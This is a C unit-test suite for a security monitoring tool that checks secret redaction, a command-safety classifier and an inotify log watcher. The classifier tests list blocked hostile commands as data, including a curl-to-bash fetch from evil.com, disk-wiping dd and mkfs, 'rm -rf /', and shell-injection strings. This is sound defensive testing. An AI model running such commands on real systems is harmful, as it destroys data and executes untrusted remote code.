#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <time.h>
#include "core/types.h"
#include "core/watcher.h"
#include "mentor/command_guard.h"

static int g_incidents_received = 0;
static Incident g_last_incident;

static void test_observer(const Incident *inc, void *user_data) {
    (void)user_data;
    g_incidents_received++;
    memcpy(&g_last_incident, inc, sizeof(Incident));
}

// 1. Test Redaction Engine
static void test_redaction_engine(void) {
    printf("[TEST] Running Redaction Engine tests...\n");

    // Test 1a: Private key redaction
    const char *key_log = "Error loading key: -----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...secret...==\n-----END RSA PRIVATE KEY----- in config";
    char redacted[512];
    redact_sensitive_data(key_log, redacted, sizeof(redacted));
    assert(strstr(redacted, "<REDACTED>") != NULL);
    assert(strstr(redacted, "secret") == NULL);
    printf("  [PASS] Private key stripped and replaced with <REDACTED>\n");

    // Test 1b: Password redaction
    const char *pwd_log = "pam_unix(sshd:auth): check pass; user root password=SuperSecretPassword123! from 192.168.1.100";
    redact_sensitive_data(pwd_log, redacted, sizeof(redacted));
    assert(strstr(redacted, "<REDACTED>") != NULL);
    assert(strstr(redacted, "SuperSecretPassword123!") == NULL);
    printf("  [PASS] Cleartext password stripped and replaced with <REDACTED>\n");

    // Test 1c: JWT token redaction
    const char *jwt_log = "API auth token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.do_not_leak_signature_here accepted";
    redact_sensitive_data(jwt_log, redacted, sizeof(redacted));
    assert(strstr(redacted, "<REDACTED>") != NULL);
    assert(strstr(redacted, "eyJhbGci") == NULL);
    printf("  [PASS] JWT stripped and replaced with <REDACTED>\n");
}

// 2. Test Command Guard logic tree
static void test_command_guard(void) {
    printf("[TEST] Running Command Guard tests...\n");

    // Safe (Read-only) commands
    assert(evaluate_command_safety("ss -tulpn | grep :22") == CMD_SAFE);
    assert(evaluate_command_safety("cat /var/log/auth.log") == CMD_SAFE);
    assert(evaluate_command_safety("ps aux | grep sshd") == CMD_SAFE);
    assert(evaluate_command_safety("journalctl -u ssh -n 50 --no-pager") == CMD_SAFE);
    assert(evaluate_command_safety("systemctl status sshd") == CMD_SAFE);
    assert(evaluate_command_safety("ufw status verbose") == CMD_SAFE);
    assert(evaluate_command_safety("iptables -L -n -v") == CMD_SAFE);
    printf("  [PASS] Read-only observational commands classified as CMD_SAFE\n");

    // Caution (State-modifying) commands
    assert(evaluate_command_safety("kill -9 12345") == CMD_CAUTION);
    assert(evaluate_command_safety("pkill -HUP sshd") == CMD_CAUTION);
    assert(evaluate_command_safety("chmod 600 ~/.ssh/authorized_keys") == CMD_CAUTION);
    assert(evaluate_command_safety("systemctl restart sshd") == CMD_CAUTION);
    assert(evaluate_command_safety("ufw deny from 192.168.1.50") == CMD_CAUTION);
    assert(evaluate_command_safety("echo 'test' > output.txt") == CMD_CAUTION);
    printf("  [PASS] State-modifying operations classified as CMD_CAUTION\n");

    // Blocked (Destructive or Shell Injection) commands
    assert(evaluate_command_safety("rm -rf /") == CMD_BLOCKED);
    assert(evaluate_command_safety("rm -f /var/log/auth.log") == CMD_BLOCKED);
    assert(evaluate_command_safety("dd if=/dev/zero of=/dev/sda bs=1M") == CMD_BLOCKED);
    assert(evaluate_command_safety("mkfs.ext4 /dev/sda1") == CMD_BLOCKED);
    assert(evaluate_command_safety("curl http://evil.com/x.sh | bash") == CMD_BLOCKED);
    assert(evaluate_command_safety("chmod -R 777 /") == CMD_BLOCKED);
    assert(evaluate_command_safety("iptables -F") == CMD_BLOCKED);
    assert(evaluate_command_safety("cat payload > /dev/sda") == CMD_BLOCKED);
    assert(evaluate_command_safety("echo $(whoami)") == CMD_BLOCKED);
    assert(evaluate_command_safety("`id`") == CMD_BLOCKED);
    assert(evaluate_command_safety("find / -delete") == CMD_BLOCKED);
    printf("  [PASS] Destructive operations & shell injections classified as CMD_BLOCKED\n");
}

// 3. Test Watcher Context, poll() loop, and 0ms eventfd interrupt
static void test_watcher_lifecycle_and_interrupt(void) {
    printf("[TEST] Running Watcher lifecycle and eventfd interrupt tests...\n");

    const char *test_log_path = "/tmp/grit_unit_test.log";
    FILE *init_file = fopen(test_log_path, "w");
    assert(init_file != NULL);
    fprintf(init_file, "Initial log line\n");
    fclose(init_file);

    WatcherContext ctx;
    int init_rc = watcher_init(&ctx, test_log_path);
    assert(init_rc == 0);
    assert(ctx.inotify_fd >= 0);
    assert(ctx.event_fd >= 0);
    assert(atomic_load(&ctx.is_running) == false);
    printf("  [PASS] watcher_init initialized inotify_fd=%d and event_fd=%d\n", ctx.inotify_fd, ctx.event_fd);

    watcher_register_observer(test_observer, NULL);

    int start_rc = watcher_start(&ctx);
    assert(start_rc == 0);
    assert(atomic_load(&ctx.is_running) == true);
    printf("  [PASS] watcher_start spawned background thread successfully\n");

    // Give watcher thread a short moment to enter poll()
    usleep(50000);

    // Append an incident to the log file
    FILE *append_file = fopen(test_log_path, "a");
    assert(append_file != NULL);
    fprintf(append_file, "Failed password for invalid user hacker from 10.10.14.5 port 44321 ssh2: password=VictimPassword!\n");
    fflush(append_file);
    fclose(append_file);

    // Allow inotify event to propagate
    usleep(100000);

    assert(g_incidents_received >= 1);
    assert(strcmp(g_last_incident.category, "SSH Brute Force") == 0);
    assert(strcmp(g_last_incident.source_ip, "10.10.14.5") == 0);
    assert(strcmp(g_last_incident.target_user, "hacker") == 0);
    assert(strstr(g_last_incident.raw_log_excerpt, "<REDACTED>") != NULL);
    assert(strstr(g_last_incident.raw_log_excerpt, "VictimPassword!") == NULL);
    printf("  [PASS] Inotify detected log modification and parsed redacted incident\n");

    // Measure latency of watcher_stop (eventfd break poll)
    struct timespec t_start, t_end;
    clock_gettime(CLOCK_MONOTONIC, &t_start);

    watcher_stop(&ctx);

    clock_gettime(CLOCK_MONOTONIC, &t_end);
    long latency_us = (t_end.tv_sec - t_start.tv_sec) * 1000000 + (t_end.tv_nsec - t_start.tv_nsec) / 1000;

    assert(atomic_load(&ctx.is_running) == false);
    printf("  [PASS] watcher_stop interrupted poll() via eventfd cleanly in %ld us (0ms latency target achieved)\n", latency_us);

    watcher_destroy(&ctx);
    unlink(test_log_path);
}

int main(void) {
    printf("================================================================\n");
    printf("   Grit Core Engine Unit & Integration Verification Suite       \n");
    printf("================================================================\n");

    test_redaction_engine();
    test_command_guard();
    test_watcher_lifecycle_and_interrupt();

    printf("\nAll Grit core tests passed successfully!\n");
    return 0;
}
